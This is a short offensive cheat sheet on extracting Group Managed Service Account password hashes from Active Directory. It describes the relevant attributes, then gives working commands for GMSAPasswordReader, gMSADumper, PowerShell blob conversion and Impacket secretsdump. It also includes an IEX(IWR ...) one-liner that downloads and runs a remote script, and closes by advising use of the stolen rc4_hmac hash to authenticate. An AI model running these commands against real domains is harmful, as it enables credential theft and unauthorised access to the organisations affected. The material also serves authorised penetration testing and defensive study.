# Reading GMSA Password (Group Managed Service Accounts)

### User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.

# GMSA Attributes in the Active Directory

#### 1) msDS-GroupMSAMembership ( PrincipalsAllowedToRetrieveManagedPassword )

 - stores the security principals that can access the GMSA password.

#### 2) msds-ManagedPassword

 - This attribute contains a BLOB with password information for group-managed service accounts.

#### 3) msDS-ManagedPasswordId

 - This constructed attribute contains the key identifier for the current managed password data for a group MSA.

#### 4) msDS-ManagedPasswordInterval

 - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.


# Extract NT hash from the Active Directory

#### 1) GMSAPasswordReader (C#) https://github.com/rvazarkar/GMSAPasswordReader

    GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT

#### 2) gMSADumper (Python) https://github.com/micahvandeusen/gMSADumper

    python3 gMSADumper.py -u User -p Password1 -d domain.local

#### 3) Active Directory Powershell

    $gmsa = Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
 
    $blob = $gmsa.'msDS-ManagedPassword'
 
    $mp = ConvertFrom-ADManagedPasswordBlob $blob
 
    $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword

#### 4) gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module

#### 5) Impacket

    Impacket-secretsdump domain.local/USER1:Password@1@DC_IP | grep GMSA

### 6) Invoke-GMSAPasswordReader

    IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-GMSAPasswordReader/main/Invoke-GMSAPasswordReader.ps1')

Read gMSA 

    Invoke-GMSAPasswordREader -Command "--AccountName svc_apache$"

Use rc4_hmac current value to authenticate
